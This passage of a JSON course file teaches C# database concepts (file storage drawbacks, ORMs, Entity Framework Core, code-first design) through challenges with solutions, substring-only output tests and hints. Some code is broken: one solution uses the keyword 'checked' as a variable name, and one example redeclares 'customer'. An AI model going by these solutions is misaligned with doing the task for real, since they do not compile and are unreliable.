              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n}\n\nvar products = new List<Product>\n{\n    new Product { Id = 1, Name = \"Laptop\", Price = 999.99m },\n    new Product { Id = 2, Name = \"Mouse\", Price = 29.99m },\n    new Product { Id = 3, Name = \"Keyboard\", Price = 79.99m },\n    new Product { Id = 4, Name = \"Monitor\", Price = 299.99m },\n    new Product { Id = 5, Name = \"Webcam\", Price = 89.99m }\n};\n\nConsole.WriteLine(\"=== SIMULATING FILE STORAGE ===\");\nforeach (var p in products)\n{\n    Console.WriteLine($\"Saving to file: {p.Id},{p.Name},{p.Price}\");\n}\n\nConsole.WriteLine(\"\\n=== SEARCHING FOR PRODUCT ID 3 ===\");\nConsole.WriteLine(\"Reading entire file...\");\n\nint searchId = 3;\nint checked = 0;\nProduct? found = null;\n\nforeach (var p in products)\n{\n    checked++;\n    Console.WriteLine($\"Checking product {p.Id}...\");\n    if (p.Id == searchId)\n    {\n        found = p;\n        break;\n    }\n}\n\nConsole.WriteLine($\"\\nChecked {checked} products to find ID {searchId}\");\nif (found != null)\n    Console.WriteLine($\"Found: {found.Name}\");\n\nConsole.WriteLine(\"\\n=== WHY FILE STORAGE IS BAD ===\");\nConsole.WriteLine(\"❌ Problem 1: Slow - Must read entire file for every search!\");\nConsole.WriteLine(\"❌ Problem 2: Not scalable - 1 million products = 1 million lines to scan!\");\nConsole.WriteLine(\"❌ Problem 3: Corruption - Concurrent writes can corrupt the file!\");\nConsole.WriteLine(\"❌ Problem 4: No relationships - Can't easily link products to orders!\");\nConsole.WriteLine(\"❌ Problem 5: No validation - Can't enforce 'email must be unique'!\");\nConsole.WriteLine(\"\\n✅ SOLUTION: Databases solve ALL of these problems!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"SIMULATING\"",
                  "expectedOutput": "SIMULATING",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"SEARCHING\"",
                  "expectedOutput": "SEARCHING",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"WHY\"",
                  "expectedOutput": "WHY",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"BAD\"",
                  "expectedOutput": "BAD",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"SOLUTION\"",
                  "expectedOutput": "SOLUTION",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"DATABASE\"",
                  "expectedOutput": "DATABASE",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Loop through products to save. Loop through again to search (simulate reading file). Count how many checked. Print problems: speed, scale, corruption, relationships."
                },
                {
                  "level": 2,
                  "text": "Thinking files are fine: For simple config or logs, files are OK! But for application DATA (users, products, orders), files are terrible. Always use database for data!"
                },
                {
                  "level": 3,
                  "text": "Not understanding indexes: Files have no indexes - must read everything! Databases create indexes on columns (like book index). Find \\\"Smith\\\" in millions of names = instant!"
                },
                {
                  "level": 4,
                  "text": "Ignoring concurrency: Single-user app? Files might work. Multi-user? Files = disaster. Databases handle thousands of concurrent users safely with locking/transactions."
                },
                {
                  "level": 5,
                  "text": "Missing transactions: If app crashes mid-write to file, file is corrupted! Databases use transactions: changes are all-or-nothing (atomic). Crash? Database rolls back, stays consistent!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Thinking files are fine",
                  "consequence": "For simple config or logs, files are OK! But for application DATA (users, products, orders), files are terrible. Always use database for data!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not understanding indexes",
                  "consequence": "Files have no indexes - must read everything! Databases create indexes on columns (like book index). Find \\\"Smith\\\" in millions of names = instant!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Ignoring concurrency",
                  "consequence": "Single-user app? Files might work. Multi-user? Files = disaster. Databases handle thousands of concurrent users safely with locking/transactions.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Missing transactions",
                  "consequence": "If app crashes mid-write to file, file is corrupted! Databases use transactions: changes are all-or-nothing (atomic). Crash? Database rolls back, stays consistent!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-12-02",
          "title": "What is an ORM? (The Translator Analogy)",
          "moduleId": "module-12",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're American visiting France:\n\nWITHOUT TRANSLATOR:\nYou: (trying French) \\\"Je... veux... uh... café?\\\"\nBarista: \\\"Quoi?\\\"\nYou: (frustrated, pointing)\n\nWITH TRANSLATOR:\nYou: \\\"I'd like a coffee, please\\\"\nTranslator: \\\"Il aimerait un café, s'il vous plaît\\\"\nBarista: \\\"Voilà!\\\" (hands coffee)\n\nThat's an ORM (Object-Relational Mapper)!\n\nWITHOUT ORM (raw SQL):\n```csharp\nstring sql = \\\"SELECT * FROM Customers WHERE Age > 25\\\";\nvar command = connection.CreateCommand();\ncommand.CommandText = sql;\nvar reader = command.ExecuteReader();\nwhile (reader.Read())\n{\n    var customer = new Customer \n    { \n        Id = (int)reader[\\\"Id\\\"],\n        Name = (string)reader[\\\"Name\\\"]\n    };\n}\n```\nCOMPLEX! SQL strings, manual mapping, error-prone!\n\nWITH ORM (Entity Framework Core):\n```csharp\nvar customers = dbContext.Customers\n    .Where(c => c.Age > 25)\n    .ToList();\n```\nSIMPLE! C# LINQ, automatic mapping, type-safe!\n\nThink: ORM = 'Translator between C# objects and database tables. You speak C#, ORM speaks SQL!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ORM CONCEPT - Entity Framework Core\n\n// 1. DEFINE YOUR CLASSES (entities)\nclass Customer\n{\n    public int Id { get; set; }  // Primary key\n    public string Name { get; set; }\n    public string Email { get; set; }\n    public int Age { get; set; }\n}\n\nclass Order\n{\n    public int Id { get; set; }\n    public int CustomerId { get; set; }  // Foreign key\n    public decimal Total { get; set; }\n    public DateTime OrderDate { get; set; }\n    \n    // Navigation property (relationship!)\n    public Customer Customer { get; set; }\n}\n\n// 2. WHAT ORM DOES BEHIND THE SCENES\n// You write:\nvar youngCustomers = dbContext.Customers\n    .Where(c => c.Age < 30)\n    .ToList();\n\n// ORM translates to SQL:\n// SELECT * FROM Customers WHERE Age < 30\n\n// You write:\nvar customer = new Customer \n{ \n    Name = \"John\", \n    Email = \"john@example.com\", \n    Age = 25 \n};\ndbContext.Customers.Add(customer);\ndbContext.SaveChanges();\n\n// ORM translates to SQL:\n// INSERT INTO Customers (Name, Email, Age) \n// VALUES ('John', 'john@example.com', 25)\n\n// You write:\nvar customer = dbContext.Customers.Find(1);\ncustomer.Email = \"newemail@example.com\";\ndbContext.SaveChanges();\n\n// ORM translates to SQL:\n// UPDATE Customers \n// SET Email = 'newemail@example.com' \n// WHERE Id = 1\n\n// BENEFITS OF ORM:\n// ✅ Type safety - compile-time errors, not runtime!\n// ✅ LINQ queries - familiar C# syntax\n// ✅ Auto-mapping - no manual reader[\"column\"] code\n// ✅ Relationships - navigate Customer.Orders easily\n// ✅ Change tracking - EF knows what changed!\n// ✅ Database agnostic - switch SQL Server to PostgreSQL easily",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`ORM = Object-Relational Mapper`**: Bridges gap between OOP (objects, classes) and relational databases (tables, rows). Translates C# to SQL automatically!\n\n**`Entity`**: C# class that maps to database table. Properties = table columns. Customer class → Customers table. One object = one row!\n\n**`DbContext`**: The 'portal' to database. Contains DbSet<T> properties for each table. Tracks changes. Generates SQL. Your main EF class!\n\n**`LINQ to SQL`**: Write LINQ queries on DbSet. ORM converts to SQL! .Where(), .Select(), .OrderBy() all become SELECT, WHERE, ORDER BY in SQL."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Understand ORM translation!\n\n1. Create a 'Book' class:\n   - int Id\n   - string Title\n   - string Author\n   - decimal Price\n   - int Year\n\n2. Create sample LINQ queries and show what SQL they would generate:\n\n   Query 1: Find all books by \\\"Orwell\\\"\n   - C# LINQ: books.Where(b => b.Author == \\\"Orwell\\\")\n   - Print equivalent SQL\n\n   Query 2: Find books over $20, sorted by price\n   - C# LINQ: books.Where(b => b.Price > 20).OrderBy(b => b.Price)\n   - Print equivalent SQL\n\n   Query 3: Get titles of books from 2020+\n   - C# LINQ: books.Where(b => b.Year >= 2020).Select(b => b.Title)\n   - Print equivalent SQL\n\n3. Show benefits of ORM:\n   - Print why type safety matters\n   - Print why LINQ is better than SQL strings\n   - Print relationship navigation benefit",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Book\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public string Author { get; set; }\n    public decimal Price { get; set; }\n    public int Year { get; set; }\n}\n\nConsole.WriteLine(\"=== ORM TRANSLATION EXAMPLES ===\");\n\n// Query 1\nConsole.WriteLine(\"\\nQuery 1: Find books by Orwell\");\nConsole.WriteLine(\"C# LINQ: books.Where(b => b.Author == \\\"Orwell\\\")\");\nConsole.WriteLine(\"SQL: SELECT * FROM Books WHERE Author = 'Orwell'\");\n\n// Query 2\nConsole.WriteLine(\"\\nQuery 2: Books over $20, sorted by price\");\nConsole.WriteLine(\"C# LINQ: /* write LINQ query */\");\nConsole.WriteLine(\"SQL: /* write equivalent SQL */\");\n\n// Query 3\nConsole.WriteLine(\"\\nQuery 3: Titles of books from 2020+\");\nConsole.WriteLine(\"C# LINQ: /* write LINQ query */\");\nConsole.WriteLine(\"SQL: /* write equivalent SQL */\");\n\n// Benefits\nConsole.WriteLine(\"\\n=== WHY ORM IS BETTER ===\");\nConsole.WriteLine(\"✅ Type safety: Compiler catches 'b.Autor' typo! SQL strings = runtime error!\");\n// Add more benefits",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Book\n{\n    public int Id { get; set; }\n    public string Title { get; set; }\n    public string Author { get; set; }\n    public decimal Price { get; set; }\n    public int Year { get; set; }\n}\n\nConsole.WriteLine(\"=== ORM TRANSLATION EXAMPLES ===\");\n\nConsole.WriteLine(\"\\nQuery 1: Find books by Orwell\");\nConsole.WriteLine(\"C# LINQ: books.Where(b => b.Author == \\\"Orwell\\\")\");\nConsole.WriteLine(\"SQL:     SELECT * FROM Books WHERE Author = 'Orwell'\");\n\nConsole.WriteLine(\"\\nQuery 2: Books over $20, sorted by price\");\nConsole.WriteLine(\"C# LINQ: books.Where(b => b.Price > 20).OrderBy(b => b.Price)\");\nConsole.WriteLine(\"SQL:     SELECT * FROM Books WHERE Price > 20 ORDER BY Price\");\n\nConsole.WriteLine(\"\\nQuery 3: Titles of books from 2020+\");\nConsole.WriteLine(\"C# LINQ: books.Where(b => b.Year >= 2020).Select(b => b.Title)\");\nConsole.WriteLine(\"SQL:     SELECT Title FROM Books WHERE Year >= 2020\");\n\nConsole.WriteLine(\"\\n=== WHY ORM (Entity Framework) IS BETTER ===\");\nConsole.WriteLine(\"✅ Type Safety: Compiler catches typos! 'b.Autor' = compile error. SQL string typo = runtime crash!\");\nConsole.WriteLine(\"✅ LINQ Familiarity: Same syntax as collections! No learning SQL for basic queries.\");\nConsole.WriteLine(\"✅ Refactoring: Rename 'Title' to 'BookTitle'? IDE updates all LINQ! SQL strings = manual find/replace.\");\nConsole.WriteLine(\"✅ Relationships: 'customer.Orders' just works! No manual JOINs for basic navigation.\");\nConsole.WriteLine(\"✅ Change Tracking: EF knows what changed. Just modify object and SaveChanges()!\");\nConsole.WriteLine(\"✅ Database Agnostic: Switch SQL Server → PostgreSQL? Change connection string. LINQ stays same!\");\nConsole.WriteLine(\"\\nORM = Productivity + Safety + Maintainability!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"ORM TRANSLATION\"",
                  "expectedOutput": "ORM TRANSLATION",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"C# LINQ\"",
                  "expectedOutput": "C# LINQ",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"SQL\"",
                  "expectedOutput": "SQL",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"WHY\"",
                  "expectedOutput": "WHY",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"BETTER\"",
                  "expectedOutput": "BETTER",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"Type Safety\"",
                  "expectedOutput": "Type Safety",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Show LINQ query, then equivalent SQL. LINQ: .Where(condition).OrderBy(field).Select(field). SQL: SELECT field FROM table WHERE condition ORDER BY field."
                },
                {
                  "level": 2,
                  "text": "Thinking ORM is slower: Yes, hand-optimized SQL CAN be faster. But for 95% of queries, ORM is fast enough! And developer productivity matters more than microseconds."
                },
                {
                  "level": 3,
                  "text": "Using ORM for everything: Complex reports with 10 joins? Sometimes raw SQL is clearer! ORMs excel at CRUD operations. Use SQL for complex analytics."
                },
                {
                  "level": 4,
                  "text": "Not understanding SQL: ORM doesn't mean 'never learn SQL!' You should understand what SQL is generated. Use logging to see queries. Debug performance issues!"
                },
                {
                  "level": 5,
                  "text": "Lazy loading traps: ORM can cause N+1 query problem! Loading 100 customers, then customer.Orders for each = 101 queries! Use .Include() to eager load (next lessons)."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Thinking ORM is slower",
                  "consequence": "Yes, hand-optimized SQL CAN be faster. But for 95% of queries, ORM is fast enough! And developer productivity matters more than microseconds.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using ORM for everything",
                  "consequence": "Complex reports with 10 joins? Sometimes raw SQL is clearer! ORMs excel at CRUD operations. Use SQL for complex analytics.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not understanding SQL",
                  "consequence": "ORM doesn't mean 'never learn SQL!' You should understand what SQL is generated. Use logging to see queries. Debug performance issues!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Lazy loading traps",
                  "consequence": "ORM can cause N+1 query problem! Loading 100 customers, then customer.Orders for each = 101 queries! Use .Include() to eager load (next lessons).",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-12-03",
          "title": "Entity Framework Core Basics",
          "moduleId": "module-12",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Entity Framework Core is Microsoft's modern ORM (Object-Relational Mapper):\n\nThink of it as a SMART ASSISTANT for database work:\n\nYou: 'I need all customers from New York'\nEF Core: Generates SQL, executes it, returns C# objects\n\nYou: 'Save this new customer'\nEF Core: Generates INSERT statement, handles it\n\nYou: 'This customer's email changed'\nEF Core: Tracks the change, generates UPDATE on SaveChanges()\n\nKEY EF CORE FEATURES:\n• Complex types (value objects)\n• Bulk operations (ExecuteDelete/ExecuteUpdate)\n• JSON columns (store JSON in database)\n• Excellent performance\n• Primitive collections support\n\nSETUP:\n1. Install packages (Microsoft.EntityFrameworkCore, provider like .Sqlite)\n2. Create entity classes\n3. Create DbContext class\n4. Configure connection\n5. Create database with migrations\n\nThink: EF Core = 'Modern, fast, feature-rich bridge between C# and databases!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ENTITY FRAMEWORK CORE SETUP\n\n// 1. INSTALL PACKAGES (via NuGet or dotnet CLI):\n// dotnet add package Microsoft.EntityFrameworkCore.Sqlite\n// dotnet add package Microsoft.EntityFrameworkCore.Design\n\nusing Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n// 2. DEFINE ENTITIES\nclass Product\n{\n    public int Id { get; set; }  // Primary Key (by convention)\n    public string Name { get; set; } = string.Empty;\n    public decimal Price { get; set; }\n    public int Stock { get; set; }\n}\n\n// 3. CREATE DBCONTEXT\nclass AppDbContext : DbContext\n{\n    // DbSet = table in database\n    public DbSet<Product> Products { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        // SQLite database (file-based, great for learning!)\n        optionsBuilder.UseSqlite(\"Data Source=app.db\");\n    }\n}\n\n// 4. USING EF CORE\nusing var context = new AppDbContext();  // Modern using declaration\n\n// ENSURE DATABASE EXISTS\ncontext.Database.EnsureCreated();\n\n// CREATE (INSERT)\nvar product = new Product \n{ \n    Name = \"Laptop\", \n    Price = 999.99m, \n    Stock = 10 \n};\ncontext.Products.Add(product);\ncontext.SaveChanges();  // Executes SQL INSERT\n\nConsole.WriteLine(\"Product added with ID: \" + product.Id);\n\n// READ (SELECT)\nvar allProducts = context.Products.ToList();\nvar expensiveProducts = context.Products\n    .Where(p => p.Price > 500)\n    .ToList();\n\n// UPDATE\nvar productToUpdate = context.Products.First();\nproductToUpdate.Price = 899.99m;\ncontext.SaveChanges();  // Executes SQL UPDATE\n\n// DELETE\nvar productToDelete = context.Products.Find(1);  // Find by primary key\nif (productToDelete != null)\n{\n    context.Products.Remove(productToDelete);\n    context.SaveChanges();  // Executes SQL DELETE\n}\n// context disposed at end of scope",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`DbContext : DbContext`**: Your DbContext inherits from EF's DbContext. Represents a session with database. Contains DbSet<T> properties for tables.\n\n**`DbSet<T>`**: Represents a table. DbSet<Product> Products = Products table. Use LINQ on DbSet to query. Add/Remove to modify.\n\n**`OnConfiguring()`**: Configure database provider and connection string. UseSqlite(), UseSqlServer(), UseNpgsql() (PostgreSQL). Override in your DbContext.\n\n**`SaveChanges()`**: Persists ALL tracked changes to database! Add, modify, remove objects, then call SaveChanges() ONCE. Batches SQL statements efficiently."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create your first Entity Framework Core application!\n\n1. Define a 'Student' entity:\n   - int Id (primary key)\n   - string Name\n   - int Age\n   - string Major\n\n2. Create 'SchoolDbContext' inheriting DbContext:\n   - DbSet<Student> Students property\n   - OnConfiguring: use SQLite (\\\"Data Source=school.db\\\")\n\n3. Simulate EF Core operations (print SQL commands that would execute):\n   - Create context\n   - Add 3 students\n   - Print: \\\"SQL: INSERT INTO Students...\\\"\n   - Query students over age 20\n   - Print: \\\"SQL: SELECT * FROM Students WHERE Age > 20\\\"\n   - Update first student's major\n   - Print: \\\"SQL: UPDATE Students SET Major = ...\\\"\n   - Delete a student\n   - Print: \\\"SQL: DELETE FROM Students WHERE Id = ...\\\"\n\nThis shows EF Core's CRUD operations!",
              "starterCode": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Student\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public int Age { get; set; }\n    public string Major { get; set; }\n}\n\nclass SchoolDbContext : DbContext\n{\n    public DbSet<Student> Students { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=school.db\");\n    }\n}\n\nConsole.WriteLine(\"=== ENTITY FRAMEWORK CORE SIMULATION ===\");\n\n// Simulate CREATE\nConsole.WriteLine(\"\\n[CREATE] Adding students...\");\nvar student1 = new Student { Name = \"Alice\", Age = 22, Major = \"Computer Science\" };\nvar student2 = new Student { Name = \"Bob\", Age = 19, Major = \"Mathematics\" };\nvar student3 = new Student { Name = \"Charlie\", Age = 23, Major = \"Physics\" };\n\nConsole.WriteLine(\"SQL: INSERT INTO Students (Name, Age, Major) VALUES ('Alice', 22, 'Computer Science')\");\nConsole.WriteLine(\"SQL: INSERT INTO Students (Name, Age, Major) VALUES ('Bob', 19, 'Mathematics')\");\nConsole.WriteLine(\"SQL: INSERT INTO Students (Name, Age, Major) VALUES ('Charlie', 23, 'Physics')\");\nConsole.WriteLine(\"3 students added!\");\n\n// Simulate READ\nConsole.WriteLine(\"\\n[READ] Querying students over age 20...\");\nConsole.WriteLine(\"SQL: SELECT * FROM Students WHERE Age > 20\");\nConsole.WriteLine(\"Found: Alice (22), Charlie (23)\");\n\n// Simulate UPDATE\nConsole.WriteLine(\"\\n[UPDATE] Changing Alice's major...\");\nConsole.WriteLine(\"SQL: UPDATE Students SET Major = 'Data Science' WHERE Id = 1\");\nConsole.WriteLine(\"Updated!\");\n\n// Simulate DELETE\nConsole.WriteLine(\"\\n[DELETE] Removing student with ID 2...\");\nConsole.WriteLine(\"SQL: DELETE FROM Students WHERE Id = 2\");\nConsole.WriteLine(\"Deleted!\");",
              "solution": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Student\n{\n    public int Id { get; set; }\n    public string Name { get; set; } = string.Empty;\n    public int Age { get; set; }\n    public string Major { get; set; } = string.Empty;\n}\n\nclass SchoolDbContext : DbContext\n{\n    public DbSet<Student> Students { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=school.db\");\n    }\n}\n\nConsole.WriteLine(\"=== ENTITY FRAMEWORK CORE SIMULATION ===\");\nConsole.WriteLine(\"Demonstrating CRUD operations with EF Core\\n\");\n\nConsole.WriteLine(\"[CREATE] Adding students...\");\nvar student1 = new Student { Id = 1, Name = \"Alice\", Age = 22, Major = \"Computer Science\" };\nvar student2 = new Student { Id = 2, Name = \"Bob\", Age = 19, Major = \"Mathematics\" };\nvar student3 = new Student { Id = 3, Name = \"Charlie\", Age = 23, Major = \"Physics\" };\n\nConsole.WriteLine(\"  context.Students.Add(student1);\");\nConsole.WriteLine(\"  context.Students.Add(student2);\");\nConsole.WriteLine(\"  context.Students.Add(student3);\");\nConsole.WriteLine(\"  context.SaveChanges();\");\nConsole.WriteLine(\"\\n  Generated SQL:\");\nConsole.WriteLine(\"    INSERT INTO Students (Name, Age, Major) VALUES ('Alice', 22, 'Computer Science')\");\nConsole.WriteLine(\"    INSERT INTO Students (Name, Age, Major) VALUES ('Bob', 19, 'Mathematics')\");\nConsole.WriteLine(\"    INSERT INTO Students (Name, Age, Major) VALUES ('Charlie', 23, 'Physics')\");\nConsole.WriteLine(\"  ✓ 3 students added!\\n\");\n\nConsole.WriteLine(\"[READ] Querying students over age 20...\");\nConsole.WriteLine(\"  var adults = context.Students.Where(s => s.Age > 20).ToList();\");\nConsole.WriteLine(\"\\n  Generated SQL:\");\nConsole.WriteLine(\"    SELECT * FROM Students WHERE Age > 20\");\nConsole.WriteLine(\"  ✓ Found: Alice (22), Charlie (23)\\n\");\n\nConsole.WriteLine(\"[UPDATE] Changing Alice's major...\");\nConsole.WriteLine(\"  var alice = context.Students.Find(1);\");\nConsole.WriteLine(\"  alice.Major = 'Data Science';\");\nConsole.WriteLine(\"  context.SaveChanges();\");\nConsole.WriteLine(\"\\n  Generated SQL:\");\nConsole.WriteLine(\"    UPDATE Students SET Major = 'Data Science' WHERE Id = 1\");\nConsole.WriteLine(\"  ✓ Updated!\\n\");\n\nConsole.WriteLine(\"[DELETE] Removing student with ID 2...\");\nConsole.WriteLine(\"  var bob = context.Students.Find(2);\");\nConsole.WriteLine(\"  context.Students.Remove(bob);\");\nConsole.WriteLine(\"  context.SaveChanges();\");\nConsole.WriteLine(\"\\n  Generated SQL:\");\nConsole.WriteLine(\"    DELETE FROM Students WHERE Id = 2\");\nConsole.WriteLine(\"  ✓ Deleted!\\n\");\n\nConsole.WriteLine(\"=== EF CORE TRACKS CHANGES AUTOMATICALLY ===\");\nConsole.WriteLine(\"You modify objects in C# → EF Core generates SQL → Database updated!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"ENTITY FRAMEWORK\"",
                  "expectedOutput": "ENTITY FRAMEWORK",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"CREATE\"",
                  "expectedOutput": "CREATE",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"READ\"",
                  "expectedOutput": "READ",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"UPDATE\"",
                  "expectedOutput": "UPDATE",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"DELETE\"",
                  "expectedOutput": "DELETE",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"SQL\"",
                  "expectedOutput": "SQL",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "DbContext: inherit from DbContext. DbSet<T>: represents table. OnConfiguring: setup connection. CRUD: Add(), Where(), modify object, Remove(). SaveChanges() executes SQL!"
                },
                {
                  "level": 2,
                  "text": "Forgetting SaveChanges(): Add/Remove/modify objects doesn't touch database! Must call context.SaveChanges() to persist. No SaveChanges() = no database changes!"
                },
                {
                  "level": 3,
                  "text": "Not disposing context: DbContext implements IDisposable! Always use 'using' statement or call Dispose(). Otherwise connection leaks!"
                },
                {
                  "level": 4,
                  "text": "Id property confusion: By convention, 'Id' or '[ClassName]Id' is primary key. EF auto-increments it on Insert. Don't set Id yourself when inserting!"
                },
                {
                  "level": 5,
                  "text": "EnsureCreated vs Migrations: EnsureCreated() creates DB but CAN'T update schema! Use Migrations in real apps. EnsureCreated() is only for learning/testing!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting SaveChanges()",
                  "consequence": "Add/Remove/modify objects doesn't touch database! Must call context.SaveChanges() to persist. No SaveChanges() = no database changes!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not disposing context",
                  "consequence": "DbContext implements IDisposable! Always use 'using' statement or call Dispose(). Otherwise connection leaks!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Id property confusion",
                  "consequence": "By convention, 'Id' or '[ClassName]Id' is primary key. EF auto-increments it on Insert. Don't set Id yourself when inserting!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using EnsureCreated() in Real Projects (NEVER DO THIS!)",
                  "consequence": "EnsureCreated() is a DEAD END for real applications! It creates the DB once but CANNOT update schema - ever! If you add a column, change a relationship, or modify any entity, EnsureCreated() will NOT apply those changes. Your only options become: (1) Delete entire database and lose all data, or (2) Manual SQL alterations. Neither is acceptable in production!",
                  "correction": "ALWAYS use Migrations in any project that will go to production or needs schema updates: 'dotnet ef migrations add InitialCreate' then 'dotnet ef database update'. EnsureCreated() is ONLY acceptable for: (1) Learning tutorials like this one, (2) Throwaway prototypes, (3) Unit tests with in-memory databases. The moment you think 'this might be real', switch to migrations immediately!"
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-12-04",
          "title": "Code-First Design (Databases from C# Classes)",
          "moduleId": "module-12",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "There are TWO ways to build a database app:\n\nDATABASE-FIRST (old way):\n1. Create database tables in SQL\n2. Generate C# classes from database\n3. Hope they stay in sync!\n\nCODE-FIRST (modern way):\n1. Write C# classes\n2. EF Core generates database from classes!\n3. Classes are source of truth\n\nCode-First is like building a house from blueprints:\n• Blueprint = C# class\n• House = Database table\n• Change blueprint → Rebuild house automatically!\n\nBENEFITS:\n✅ Version control - Classes in Git, database changes tracked!\n✅ Refactoring - Rename property? Database updates!\n✅ Portable - Same classes work with SQL Server, PostgreSQL, etc.\n✅ Testable - Use in-memory database for tests\n\nThink: Code-First = 'Your C# code IS the database schema. Database generated from code!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.ComponentModel.DataAnnotations;\n\n// STEP 1: DEFINE ENTITIES (classes)\nclass Customer\n{\n    public int Id { get; set; }  // Primary key (convention)\n    \n    [Required]  // NOT NULL in database\n    [MaxLength(100)]  // VARCHAR(100)\n    public string Name { get; set; } = string.Empty;\n    \n    [Required]\n    [EmailAddress]  // Validation attribute\n    public string Email { get; set; } = string.Empty;\n    \n    public int Age { get; set; }\n    \n    // Navigation property - RELATIONSHIP!\n    public List<Order> Orders { get; set; } = new();\n}\n\nclass Order\n{\n    public int Id { get; set; }\n    \n    public int CustomerId { get; set; }  // Foreign key\n    \n    [Column(TypeName = \"decimal(18,2)\")]  // Precision for money\n    public decimal Total { get; set; }\n    \n    public DateTime OrderDate { get; set; }\n    \n    // Navigation property\n    public Customer Customer { get; set; } = null!;\n}\n\n// STEP 2: DBCONTEXT\nclass StoreDbContext : DbContext\n{\n    public DbSet<Customer> Customers { get; set; }\n    public DbSet<Order> Orders { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=store.db\");\n    }\n    \n    // STEP 